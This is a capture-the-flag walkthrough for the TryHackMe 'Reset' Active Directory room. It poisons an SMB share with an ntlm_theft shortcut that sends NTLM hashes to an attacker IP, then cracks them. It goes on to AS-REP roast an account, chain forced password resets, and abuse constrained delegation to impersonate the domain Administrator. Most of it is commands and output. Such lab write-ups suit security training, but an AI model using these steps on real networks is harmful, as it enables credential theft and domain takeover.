# [Reset](https://tryhackme.com/room/resetui)

## This challenge simulates a cyber-attack scenario where you must exploit an Active Directory environment.

# Find all the flags!

Step into the shoes of a red teamer in our simulated hack challenge!
Navigate a realistic organizational environment with up-to-date defenses.

Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

Find all the flags!

### What is the user flag?

1. Perform a full port scan with service and version detection to identify all open ports and running services on the target.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-04 19:01:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-04T19:02:33+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-04T19:01:53+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2026-05-03T18:57:01
|_Not valid after:  2026-11-02T18:57:01
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-05-04T19:01:57
|_  start_date: N/A
```

2. Enumerate available SMB shares using a null session to identify any accessible network resources.

```bash
smbclient -L <TARGET_IP> -N
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Data            Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

3. Connect to the `Data` share anonymously, navigate to the onboarding subdirectory, and list the available files.

```bash
smbclient //<TARGET_IP>/Data -N
cd onboarding\
ls
```

**Results:**

```
1ly4usyd.amu.pdf                    A  4700896  Mon Jul 17 04:11:53 2023
akd0g5fb.swl.pdf                    A  3032659  Mon Jul 17 04:12:09 2023
ynfq01uw.bc1.txt                    A      521  Mon Aug 21 14:21:59 2023
```

> The `onboarding` directory contains PDF documents and a text file used in the employee onboarding process. Since this share is likely browsed by domain users or automated processes running under a service account, we can plant a malicious file here that will silently trigger an NTLM authentication attempt back to our machine whenever a Windows host accesses the directory.

4. Use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to generate a malicious Windows Internet Shortcut file. When a Windows host browses the folder, the shell will attempt to resolve the shortcut's icon from the attacker-controlled IP, triggering an NTLM authentication handshake. The `-g url` flag specifies the URL shortcut format, `-s` sets the attacker IP for the callback, and `-f` sets the output filename prefix.

```bash
python3 ntlm_theft.py -g url -s <ATTACKER_IP> -f test
```

5. Start Responder on the `tun0` interface to intercept and capture incoming NTLM authentication attempts from any host that accesses the poisoned share.

```bash
sudo responder -I tun0
```

6. Re-connect to the `Data` SMB share and upload the generated malicious URL file into the `onboarding` directory. Any Windows machine that browses this directory will automatically attempt to fetch the shortcut's icon from our machine, sending us their NTLM credentials.

```bash
put test-(icon).url
```

7. After a short wait, Responder captures an NTLMv2 hash from the `AUTOMATE` service account as it automatically accesses the share. Save the hash to a file for offline cracking.

```
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:86a0452b27e8f4a0:7D57A8CFAEE2BF4C224A4069FB6F93F2:010100000000000000641903EDDBDC01D0087DB88FFDCFC9000000000200080053004E005600560001001E00570049004E002D005400550031003800570036005400300030005300460004003400570049004E002D00540055003100380057003600540030003000530046002E0053004E00560056002E004C004F00430041004C000300140053004E00560056002E004C004F00430041004C000500140053004E00560056002E004C004F00430041004C000700080000641903EDDBDC010600040002000000080030003000000000000000010000000020000033493D7B1DC418CAF46DA7E75F84E1A1740E5FB2E7B984C35B6AD0F1A2687DDE0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100340031002E00340037000000000000000000
```

8. Use John the Ripper with the rockyou wordlist to crack the captured NTLMv2 hash and recover the plaintext password for the `AUTOMATE` account.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

9. Use Evil-WinRM to establish an authenticated remote PowerShell session on the target using the cracked credentials.

```bash
evil-winrm -i <TARGET_IP> -u AUTOMATE -p Passw0rd1
```

10. Navigate to the `AUTOMATE` user's Desktop and read the user flag.

```bash
cd ../Desktop
dir
type user.txt
```

<img width="1045" height="466" alt="SCREEN01" src="https://github.com/user-attachments/assets/fc9bc161-6f2a-4dc9-8b3c-962cbecedad0" />

---

### What is the root flag?

1. Add both the domain name and the fully qualified hostname to the local `hosts` file so that Kerberos tooling and DNS-dependent scripts can resolve the target correctly.

```bash
echo "<TARGET_IP> thm.corp haystack.thm.corp" >> /etc/hosts
```

2. Download `GetNPUsers.py` from the Impacket toolkit. This script queries a Kerberos Domain Controller for accounts that have Kerberos pre-authentication disabled, making them vulnerable to AS-REP roasting.

```bash
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py
```

3. Run `GetNPUsers.py` authenticated as `AUTOMATE` to enumerate all domain accounts with the `DONT_REQ_PREAUTH` UAC flag set. This reveals three accounts whose AS-REP tickets can be requested and cracked offline without knowing their passwords.

```bash
python3 GetNPUsers.py thm.corp/AUTOMATE
# Password: Passw0rd1
```

**Results:**

```bash
Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC
-------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 12:21:44.224354  <never>                     0x410200
TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 16:32:59.571306  2023-08-21 16:32:05.792734  0x410200
LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 12:21:44.161807  2023-06-16 08:16:11.147334  0x410200
```

4. Request an AS-REP Kerberos ticket for `TABATHA_BRITT` without providing a password, exploiting the disabled pre-authentication requirement.

```bash
python3 GetNPUsers.py thm.corp/TABATHA_BRITT
# Password: Press enter
```

**Results:**

```
Password:
[*] Cannot authenticate TABATHA_BRITT, getting its TGT
$krb5asrep$23$TABATHA_BRITT@THM.CORP:7a3419b61108248157923ecf7ecfcc2a$b26778e485ce5a4c741fbaae943c5ba642b11d133b873104bf64de5a46b7faedf245f534c7b449bf04c658f1cc13a76a7088cfa39593b8ea6aade4ccc1423dbda951957fc3d99d942c210e3e65d41f94ce2222be4108335b65812fb0c8e6e1f2c0a2259b755d93b37fa530e2ebbbf74ffac367170fccb345319c80427b64513de91e086fdd1f2a716b7d195f6946d9d8657217ca355fd6e28dde5ee20b676ab5974eba417ee0b9f2198bb222caddd3fa9c35c32ebd5727d7cb2640f7c87914773e9041e8bc6d274b52db1b49d27f059693abb9e6d99bb98721fc35ca2283fcb0aac2a2f4
```

> Save the AS-REP hash to a file for cracking.

5. Crack the AS-REP hash using John the Ripper to recover `TABATHA_BRITT`'s plaintext password.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

6. Download dnschef, a lightweight DNS proxy tool. This is required because `bloodhound-python` needs to resolve the domain by DNS name, and the target's DNS server must be reachable. dnschef intercepts all DNS queries locally and forwards them to the target DC.

```bash
wget https://raw.githubusercontent.com/iphelix/dnschef/refs/heads/master/dnschef.py
```

7. Launch dnschef in a separate terminal to spoof all DNS responses, redirecting them to the target IP. This allows `bloodhound-python` to resolve `thm.corp` as if we were using the DC's own DNS resolver.

```bash
python3 dnschef.py --fakeip <TARGET_IP> --nameserver <TARGET_IP>
```

8. Run `bloodhound-python` to collect all Active Directory enumeration data using `TABATHA_BRITT`'s credentials, pointing DNS resolution at the local dnschef proxy. The output is a set of JSON files ready for BloodHound ingestion.

```bash
bloodhound-python -d thm.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)' -dc thm.corp -c all -ns 127.0.0.1
```

<img width="1757" height="564" alt="SCREEN02" src="https://github.com/user-attachments/assets/6e3deae0-18f7-48d2-bd45-4baeadf7def8" />

9. Abuse the `ForceChangePassword` ACE to reset `SHAWNA_BRAY`'s password using `TABATHA_BRITT`'s credentials. This does not require knowledge of the current password.

```bash
net rpc password "SHAWNA_BRAY" "newP@ssword2026" -U 'TABATHA_BRITT'%'marlboro(1985)' -I '<TARGET_IP>' -S "THM.CORP"
```

10. Verify that `SHAWNA_BRAY`'s new credentials are valid against the target with CrackMapExec.

```bash
crackmapexec smb haystack.thm.corp -u 'SHAWNA_BRAY' -p 'newP@ssword2026'
```

**Results:**

```
SMB         thm.corp        445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:newP@ssword2026
```

11. Continue down the chain. Force-reset `CRUZ_HALL`'s password using `SHAWNA_BRAY`'s newly obtained credentials.

```bash
net rpc password "CRUZ_HALL" "NewPassword123@" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssword2026" -S "haystack.thm.corp"
```

12. Verify `CRUZ_HALL`'s new credentials are accepted.

```bash
crackmapexec smb haystack.thm.corp -u 'CRUZ_HALL' -p 'NewPassword123@'
```

**Results:**

```
SMB         thm.corp        445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\CRUZ_HALL:NewPassword123@
```

13. Complete the password reset chain by force-resetting `DARLA_WINTERS`'s password using `CRUZ_HALL`'s credentials.

```bash
net rpc password "DARLA_WINTERS" "NewPassword123@" -U "THM.CORP"/"CRUZ_HALL"%"NewPassword123@" -S "haystack.thm.corp"
```

14. Verify `DARLA_WINTERS`'s new credentials are accepted.

```bash
crackmapexec smb haystack.thm.corp -u 'DARLA_WINTERS' -p 'NewPassword123@'
```

**Results:**

```
SMB         thm.corp        445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         thm.corp        445    HAYSTACK         [+] thm.corp\DARLA_WINTERS:NewPassword123@
```

15. Exploit `DARLA_WINTERS`'s constrained delegation rights using Impacket's `getST.py`. This performs an S4U2Self followed by an S4U2Proxy request to obtain a Kerberos service ticket for the CIFS service on the Domain Controller, impersonating the domain Administrator. The resulting credential cache is saved to disk.

```bash
python3 getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:NewPassword123@"
```

**Results:**

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

16. Set the `KRB5CCNAME` environment variable to point at the saved credential cache, then use `wmiexec.py` with pass-the-ticket to execute commands on the Domain Controller as Administrator.

```bash
export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
python3 wmiexec.py -k -no-pass Administrator@haystack.thm.corp
```

17. Read the root flag from the Administrator's Desktop.

```bash
type C:\Users\Administrator\Desktop\root.txt
```

<img width="608" height="410" alt="SCREEN03" src="https://github.com/user-attachments/assets/c3fab196-9020-4d71-97ef-2462330cbe05" />
